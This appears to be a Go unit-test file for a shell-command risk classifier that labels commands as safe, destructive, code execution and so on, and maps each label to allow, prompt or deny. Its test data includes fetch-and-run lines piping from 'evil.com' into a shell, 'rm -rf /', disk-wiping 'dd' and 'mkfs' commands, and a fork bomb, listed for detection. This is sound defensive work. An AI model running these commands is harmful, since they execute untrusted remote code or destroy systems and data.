@@ -1,0 +1,519 @@
+package danger
+
+import (
+	"testing"
+)
+
+func TestClassify_Safe_Commands(t *testing.T) {
+	tests := []struct {
+		cmd string
+		cls RiskClass
+	}{
+		{"ls", Safe},
+		{"ls -la /tmp", Safe},
+		{"cat file.go", Safe},
+		{"head -n 5 main.go", Safe},
+		{"tail -f log.txt", Safe},
+		{"pwd", Safe},
+		{"which go", Safe},
+		{"find . -name '*.go'", Safe},
+		{"grep -r 'func' .", Safe},
+		{"wc -l main.go", Safe},
+		{"sort data.txt", Safe},
+		{"uniq names.txt", Safe},
+		{"diff a.txt b.txt", Safe},
+		{"cmp old new", Safe},
+		{"date", Safe},
+		{"env", Safe},
+		{"printenv HOME", Safe},
+		{"echo hello world", Safe},
+		{"go build ./...", Safe},
+		{"go vet ./...", Safe},
+		{"go fmt ./...", Safe},
+		{"go mod tidy", Safe},
+		{"go test ./...", Safe},
+		{"go test -v -run TestFoo", Safe},
+	}
+	for _, tt := range tests {
+		t.Run(tt.cmd, func(t *testing.T) {
+			got := Classify(tt.cmd)
+			if got != tt.cls {
+				t.Errorf("Classify(%q) = %s, want %s", tt.cmd, got, tt.cls)
+			}
+		})
+	}
+}
+
+func TestClassify_Safe_IgnoredRedirects(t *testing.T) {
+	// echo with redirect is NOT safe — it writes
+	tests := []struct {
+		cmd string
+		cls RiskClass
+	}{
+		{"echo hello > file.go", LocalWrite},
+		{"echo hello >> file.go", LocalWrite},
+	}
+	for _, tt := range tests {
+		t.Run(tt.cmd, func(t *testing.T) {
+			got := Classify(tt.cmd)
+			if got != tt.cls {
+				t.Errorf("Classify(%q) = %s, want %s", tt.cmd, got, tt.cls)
+			}
+		})
+	}
+}
+
+func TestClassify_LocalWrite_Commands(t *testing.T) {
+	tests := []struct {
+		cmd string
+		cls RiskClass
+	}{
+		{"echo hello > file.go", LocalWrite},
+		{"echo hello >> file.go", LocalWrite},
+		{"echo 'log' > /tmp/temp.txt", LocalWrite}, // /tmp is not system
+		{"rm file.go", LocalWrite},
+		{"rm -f temp.txt", LocalWrite},
+		{"rm -rf node_modules", LocalWrite},
+		{"mv old.go new.go", LocalWrite},
+		{"cp a.go b.go", LocalWrite},
+		{"touch main.go", LocalWrite},
+		{"mkdir dist", LocalWrite},
+		{"rmdir old_dir", LocalWrite},
+		{"sed -i 's/foo/bar/' file.go", LocalWrite},
+		{"awk '{print $1}' input.txt > output.txt", LocalWrite},
+		{"tee output.txt", LocalWrite},
+		{"cat > file.go", LocalWrite},
+		{"chmod +x script.sh", LocalWrite},
+	}
+	for _, tt := range tests {
+		t.Run(tt.cmd, func(t *testing.T) {
+			got := Classify(tt.cmd)
+			if got != tt.cls {
+				t.Errorf("Classify(%q) = %s, want %s", tt.cmd, got, tt.cls)
+			}
+		})
+	}
+}
+
+func TestClassify_SystemWrite_Commands(t *testing.T) {
+	tests := []struct {
+		cmd string
+		cls RiskClass
+	}{
+		{"sudo apt update", SystemWrite},
+		{"sudo rm /etc/nginx/nginx.conf", SystemWrite},
+		{"echo 'config' > /etc/nginx/conf.d/default.conf", SystemWrite},
+		{"apt install nginx", SystemWrite},
+		{"apt-get update", SystemWrite},
+		{"yum install httpd", SystemWrite},
+		{"brew install node", SystemWrite},
+		{"dpkg -i package.deb", SystemWrite},
+		{"systemctl restart nginx", SystemWrite},
+		{"service nginx restart", SystemWrite},
+		{"useradd john", SystemWrite},
+		{"groupadd developers", SystemWrite},
+		{"passwd john", SystemWrite},
+		{"chown root:root /etc/hosts", SystemWrite},
+	}
+	for _, tt := range tests {
+		t.Run(tt.cmd, func(t *testing.T) {
+			got := Classify(tt.cmd)
+			if got != tt.cls {
+				t.Errorf("Classify(%q) = %s, want %s", tt.cmd, got, tt.cls)
+			}
+		})
+	}
+}
+
+func TestClassify_Destructive_Commands(t *testing.T) {
+	tests := []struct {
+		cmd string
+		cls RiskClass
+	}{
+		{"rm -rf /", Destructive},
+		{"rm -rf --no-preserve-root /", Destructive},
+		{"rm -rf /var", Destructive},
+		{"dd if=/dev/zero of=/dev/sda", Destructive},
+		{"dd if=/dev/urandom of=/dev/nvme0n1", Destructive},
+		{"mkfs.ext4 /dev/sda1", Destructive},
+		{"fdisk /dev/sda", Destructive},
+		{"parted /dev/sda", Destructive},
+	}
+	for _, tt := range tests {
+		t.Run(tt.cmd, func(t *testing.T) {
+			got := Classify(tt.cmd)
+			if got != tt.cls {
+				t.Errorf("Classify(%q) = %s, want %s", tt.cmd, got, tt.cls)
+			}
+		})
+	}
+}
+
+func TestClassify_NetworkEgress_Commands(t *testing.T) {
+	tests := []struct {
+		cmd string
+		cls RiskClass
+	}{
+		{"curl https://example.com", NetworkEgress},
+		{"wget https://example.com/file", NetworkEgress},
+		{"git push origin main", NetworkEgress},
+		{"git push --force origin main", NetworkEgress},
+		{"scp file user@remote:/path", NetworkEgress},
+		{"rsync -avz ./ user@remote:/backup", NetworkEgress},
+		{"nc example.com 80", NetworkEgress},
+		{"ncat -v example.com 443", NetworkEgress},
+		{"ssh user@server", NetworkEgress},
+		{"ftp ftp.example.com", NetworkEgress},
+		{"sftp user@server", NetworkEgress},
+		{"telnet host 22", NetworkEgress},
+	}
+	for _, tt := range tests {
+		t.Run(tt.cmd, func(t *testing.T) {
+			got := Classify(tt.cmd)
+			if got != tt.cls {
+				t.Errorf("Classify(%q) = %s, want %s", tt.cmd, got, tt.cls)
+			}
+		})
+	}
+}
+
+func TestClassify_NetworkEgress_GitPushNeedsRemote(t *testing.T) {
+	// git push without args is safe (just prints upstream info)
+	got := Classify("git push")
+	if got != Safe {
+		t.Errorf("Classify(\"git push\") = %s, want safe", got)
+	}
+}
+
+func TestClassify_CodeExecution_Commands(t *testing.T) {
+	tests := []struct {
+		cmd string
+		cls RiskClass
+	}{
+		{"curl http://evil.com/script.sh | bash", CodeExecution},
+		{"wget -O- http://evil.com/run.sh | sh", CodeExecution},
+		{"curl -fsSL https://get.docker.com | sh", CodeExecution},
+		{"curl http://example.com/script | zsh", CodeExecution},
+		{"curl http://example.com/script | fish", CodeExecution},
+		{"eval \"$(curl -s http://evil.com/x)\"", CodeExecution},
+		{"node -e \"console.log('hi')\"", CodeExecution},
+		{"python -c \"print('hello')\"", CodeExecution},
+		{"python3 -c \"import os; os.system('ls')\"", CodeExecution},
+		{"perl -e 'print \"hi\"'", CodeExecution},
+		{"ruby -e 'puts \"hi\"'", CodeExecution},
+		{"php -r 'echo \"hi\";'", CodeExecution},
+	}
+	for _, tt := range tests {
+		t.Run(tt.cmd, func(t *testing.T) {
+			got := Classify(tt.cmd)
+			if got != tt.cls {
+				t.Errorf("Classify(%q) = %s, want %s", tt.cmd, got, tt.cls)
+			}
+		})
+	}
+}
+
+func TestClassify_CodeExecution_PipeOnly(t *testing.T) {
+	// pipe to a shell interpreter, not a general pipe
+	got := Classify("cat file.go | grep foo")
+	if got != Safe {
+		t.Errorf("Classify(\"cat file.go | grep foo\") = %s, want safe", got)
+	}
+}
+
+func TestClassify_Install_Commands(t *testing.T) {
+	tests := []struct {
+		cmd string
+		cls RiskClass
+	}{
+		{"npm install", Install},
+		{"npm install express", Install},
+		{"npm ci", Install},
+		{"npm i", Install},
+		{"npm i lodash", Install},
+		{"pip install flask", Install},
+		{"pip3 install requests", Install},
+		{"gem install rails", Install},
+		{"cargo install ripgrep", Install},
+		{"go install github.com/foo/bar@latest", Install},
+		{"apt install python3", SystemWrite},
+		{"apt-get install git", SystemWrite},
+	}
+	for _, tt := range tests {
+		t.Run(tt.cmd, func(t *testing.T) {
+			got := Classify(tt.cmd)
+			if got != tt.cls {
+				t.Errorf("Classify(%q) = %s, want %s", tt.cmd, got, tt.cls)
+			}
+		})
+	}
+}
+
+func TestClassify_Install_GoInstallNeedsRemote(t *testing.T) {
+	// go install without a remote path is just local build
+	got := Classify("go install")
+	if got != Safe {
+		t.Errorf("Classify(\"go install\") = %s, want safe", got)
+	}
+}
+
+func TestClassify_Blocked_Commands(t *testing.T) {
+	tests := []struct {
+		cmd string
+		cls RiskClass
+	}{
+		{":(){ :|:& };:", Blocked},
+		{"dd if=/dev/zero of=/dev/sda bs=1M", Blocked},
+	}
+	for _, tt := range tests {
+		t.Run(tt.cmd, func(t *testing.T) {
+			got := Classify(tt.cmd)
+			if got != tt.cls {
+				t.Errorf("Classify(%q) = %s, want %s", tt.cmd, got, tt.cls)
+			}
+		})
+	}
+}
+
+func TestClassify_Priority_Wins(t *testing.T) {
+	tests := []struct {
+		name string
+		cmd  string
+		cls  RiskClass
+	}{
+		{
+			name: "pipe_from_curl_is_code_execution_not_network",
+			cmd:  "curl http://evil.com/script.sh | bash",
+			cls:  CodeExecution,
+		},
+		{
+			name: "sudo_rm_is_system_write_not_local",
+			cmd:  "sudo rm -rf /var/log",
+			cls:  SystemWrite,
+		},
+		{
+			name: "rm_root_is_destructive_not_local",
+			cmd:  "rm -rf /",
+			cls:  Destructive,
+		},
+		{
+			name: "npm_install_with_curl_is_install",
+			cmd:  "curl http://evil.com/preinstall.sh | sh && npm install",
+			cls:  CodeExecution, // first command is code execution
+		},
+		{
+			name: "echo_to_etc_is_system_write",
+			cmd:  "echo 'config' >> /etc/hosts",
+			cls:  SystemWrite,
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := Classify(tt.cmd)
+			if got != tt.cls {
+				t.Errorf("Classify(%q) = %s, want %s", tt.cmd, got, tt.cls)
+			}
+		})
+	}
+}
+
+func TestClassify_EdgeCases(t *testing.T) {
+	tests := []struct {
+		name string
+		cmd  string
+		cls  RiskClass
+	}{
+		{"empty", "", Safe},
+		{"just_spaces", "   ", Safe},
+		{"semicolons", "echo hi; rm -rf /", Destructive},
+		{"newlines", "echo hi\nrm -rf /", Destructive},
+		{"quoted_rm", `rm -rf "/tmp/test dir"`, LocalWrite},
+		{"compound_and", "cd /etc && rm nginx.conf", LocalWrite},
+		{"compound_or_fallback", "false || echo ok", Safe},
+		{"go_install_no_arg", "go install", Safe},
+		{"go_install_remote", "go install github.com/foo/bar@latest", Install},
+		{"git_push_no_arg", "git push", Safe},
+		{"git_push_remote", "git push origin main", NetworkEgress},
+		{"sudo_ls_is_system_write", "sudo ls /root", SystemWrite},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := Classify(tt.cmd)
+			if got != tt.cls {
+				t.Errorf("Classify(%q) = %s, want %s", tt.cmd, got, tt.cls)
+			}
+		})
+	}
+}
+
+func TestClassify_ConfigDefaults(t *testing.T) {
+	cfg := DangerousConfig{}
+	// No config = safe defaults
+	if got := cfg.ActionFor(Safe); got != Allow {
+		t.Errorf("ActionFor(safe) = %s, want allow", got)
+	}
+	if got := cfg.ActionFor(LocalWrite); got != Allow {
+		t.Errorf("ActionFor(local_write) = %s, want allow", got)
+	}
+	if got := cfg.ActionFor(SystemWrite); got != Prompt {
+		t.Errorf("ActionFor(system_write) = %s, want prompt", got)
+	}
+	if got := cfg.ActionFor(Destructive); got != Deny {
+		t.Errorf("ActionFor(destructive) = %s, want deny", got)
+	}
+	if got := cfg.ActionFor(NetworkEgress); got != Prompt {
+		t.Errorf("ActionFor(network_egress) = %s, want prompt", got)
+	}
+	if got := cfg.ActionFor(CodeExecution); got != Prompt {
+		t.Errorf("ActionFor(code_execution) = %s, want prompt", got)
+	}
+	if got := cfg.ActionFor(Install); got != Prompt {
+		t.Errorf("ActionFor(install) = %s, want prompt", got)
+	}
+	if got := cfg.ActionFor(Blocked); got != Deny {
+		t.Errorf("ActionFor(blocked) = %s, want deny", got)
+	}
+	if got := cfg.ActionFor(RiskClass("unknown")); got != Prompt {
+		t.Errorf("ActionFor(unknown) = %s, want prompt (default)", got)
+	}
+}
+
+func TestClassify_Config_DefaultAction(t *testing.T) {
+	cfg := DangerousConfig{DefaultAction: strPtr("prompt")}
+	if got := cfg.ActionFor(RiskClass("unknown")); got != Prompt {
+		t.Errorf("ActionFor(unknown) with default=prompt = %s, want prompt", got)
+	}
+
+	cfg2 := DangerousConfig{DefaultAction: strPtr("deny")}
+	if got := cfg2.ActionFor(Safe); got != Allow {
+		t.Errorf("ActionFor(safe) with default=deny should still be allow (safe defaults always allow)")
+	}
+}
+
+func TestClassify_Config_OverrideClass(t *testing.T) {
+	cfg := DangerousConfig{
+		Classes: map[RiskClass]Action{
+			Destructive: Allow,
+		},
+	}
+	if got := cfg.ActionFor(Destructive); got != Allow {
+		t.Errorf("ActionFor(destructive) after override = %s, want allow", got)
+	}
+	// Other classes unaffected
+	if got := cfg.ActionFor(SystemWrite); got != Prompt {
+		t.Errorf("ActionFor(system_write) after destructive override = %s, want prompt", got)
+	}
+}
+
+func TestClassify_Config_Allowlist(t *testing.T) {
+	cfg := DangerousConfig{
+		Allowlist: []string{"git push origin main", "npm run deploy"},
+	}
+	tests := []struct {
+		cmd string
+		cls Action
+	}{
+		{"git push origin main", Allow},
+		{"npm run deploy", Allow},
+		{"git push origin feature", Prompt}, // not in allowlist
+		{"rm -rf /", Deny},                  // default for destructive
+	}
+	for _, tt := range tests {
+		t.Run(tt.cmd, func(t *testing.T) {
+			got := cfg.ActionForCommand(tt.cmd)
+			if got != tt.cls {
+				t.Errorf("ActionForCommand(%q) = %s, want %s", tt.cmd, got, tt.cls)
+			}
+		})
+	}
+}
+
+func TestClassify_Config_Denylist(t *testing.T) {
+	cfg := DangerousConfig{
+		Denylist: []string{"rm -rf /", "dd if=/dev/zero"},
+	}
+	tests := []struct {
+		cmd string
+		cls Action
+	}{
+		{"rm -rf /", Deny},
+		{"dd if=/dev/zero of=/dev/sda", Deny},
+		// rm -rf node_modules is local_write → default allow
+		{"rm -rf node_modules", Allow},
+		{"ls", Allow},
+	}
+	for _, tt := range tests {
+		t.Run(tt.cmd, func(t *testing.T) {
+			got := cfg.ActionForCommand(tt.cmd)
+			if got != tt.cls {
+				t.Errorf("ActionForCommand(%q) = %s, want %s", tt.cmd, got, tt.cls)
+			}
+		})
+	}
+}
+
+func TestClassify_Config_AllowlistOverrideDenylist(t *testing.T) {
+	// allowlist takes priority
+	cfg := DangerousConfig{
+		Allowlist: []string{"git push origin main"},
+		Denylist:  []string{"git push"},
+	}
+	if got := cfg.ActionForCommand("git push origin main"); got != Allow {
+		t.Errorf("allowlist should override denylist: got %s, want allow", got)
+	}
+}
+
+func TestClassify_Config_NonInteractive(t *testing.T) {
+	cfg := DangerousConfig{NonInteractive: strPtr("deny")}
+	// When no /dev/tty, this fallback is used
+	if got := cfg.NonInteractiveAction(); got != Deny {
+		t.Errorf("NonInteractiveAction() = %s, want deny", got)
+	}
+
+	cfg2 := DangerousConfig{NonInteractive: strPtr("allow")}
+	if got := cfg2.NonInteractiveAction(); got != Allow {
+		t.Errorf("NonInteractiveAction() = %s, want allow", got)
+	}
+
+	cfg3 := DangerousConfig{}
+	if got := cfg3.NonInteractiveAction(); got != Allow {
+		t.Errorf("default NonInteractiveAction() = %s, want allow", got)
+	}
+}
+
+func TestClassify_Tokenize(t *testing.T) {
+	tests := []struct {
+		name  string
+		input string
+		want  []string
+	}{
+		{"basic", "ls -la /tmp", []string{"ls", "-la", "/tmp"}},
+		{"quoted", `echo "hello world"`, []string{"echo", "hello world"}},
+		{"single_quoted", `echo 'hello world'`, []string{"echo", "hello world"}},
+		{"redirect", "echo hi > file", []string{"echo", "hi", ">", "file"}},
+		{"append_redirect", "echo hi >> file", []string{"echo", "hi", ">>", "file"}},
+		{"pipe", "cat file | grep foo", []string{"cat", "file", "|", "grep", "foo"}},
+		{"and", "rm -rf / && echo done", []string{"rm", "-rf", "/", "&&", "echo", "done"}},
+		{"or", "false || echo ok", []string{"false", "||", "echo", "ok"}},
+		{"semicolon", "echo a; echo b", []string{"echo", "a", ";", "echo", "b"}},
+		{"newline", "echo a\nrm b", []string{"echo", "a", ";", "rm", "b"}},
+		{"empty", "", nil},
+		{"spaces", "   ", nil},
+		{"mixed_quotes", `echo "it's fine"`, []string{"echo", "it's fine"}},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := tokenize(tt.input)
+			if len(got) != len(tt.want) {
+				t.Fatalf("tokenize(%q) = %v (len=%d), want %v (len=%d)", tt.input, got, len(got), tt.want, len(tt.want))
+			}
+			for i := range got {
+				if got[i] != tt.want[i] {
+					t.Errorf("tokenize(%q)[%d] = %q, want %q", tt.input, i, got[i], tt.want[i])
+				}
+			}
+		})
+	}
+}
+
+func strPtr(s string) *string { return &s }
